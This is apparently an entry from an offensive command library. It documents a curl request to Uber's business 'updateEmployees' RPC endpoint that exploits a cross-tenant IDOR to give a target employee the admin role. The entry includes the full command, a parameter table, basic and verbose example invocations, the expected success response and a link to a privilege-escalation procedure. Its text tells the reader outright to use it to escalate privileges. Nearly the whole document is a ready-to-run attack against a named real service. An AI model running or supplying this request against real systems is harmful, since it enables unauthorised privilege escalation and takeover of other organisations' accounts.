---
data: >-
  curl -X POST 'https://business.uber.com/_rpc?rpc=updateEmployees' -H
  'Authorization: Bearer YOUR_AUTH_TOKEN' -H 'Content-Type: application/json' -d
  '{"employeeUuid": "TARGET_EMPLOYEE_UUID", "role": "admin"}'
tags:
  - web
  - exploit
  - http
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0110607d-39cf-459a-a956-6eb5df6a7425
created_at: '2025-12-14T17:29:44.907Z'
updated_at: '2025-12-14T17:29:44.907Z'
verified: false
validated: true
submitted: true
---
# curl-update-employees-request

## Command

```bash
curl -X POST 'https://business.uber.com/_rpc?rpc=updateEmployees' \
  -H 'Authorization: Bearer YOUR_AUTH_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"employeeUuid": "TARGET_EMPLOYEE_UUID", "role": "admin"}'
```

## Description

This curl command sends a POST request to Uber's updateEmployees RPC endpoint to exploit an IDOR by updating an employee's role to admin using a cross-tenant employeeUuid. Use it in authenticated sessions to escalate privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://business.uber.com/_rpc?rpc=updateEmployees` | Target endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_AUTH_TOKEN'` | Authentication header with bearer token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{"employeeUuid": "TARGET_EMPLOYEE_UUID", "role": "admin"}'` | JSON payload with target UUID and new role | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://business.uber.com/_rpc?rpc=updateEmployees' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"employeeUuid": "abc-123", "role": "admin"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://business.uber.com/_rpc?rpc=updateEmployees' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"employeeUuid": "abc-123", "role": "admin"}'
```

## Expected Output

A successful response will return a JSON object confirming the update, such as {"success": true, "employee": {"uuid": "abc-123", "role": "admin"}}. Errors may indicate invalid tokens or authorization failures.

## Related

- [[Related Procedure: Exploit-Cross-Tenant-IDOR-for-Privilege-Escalation]]
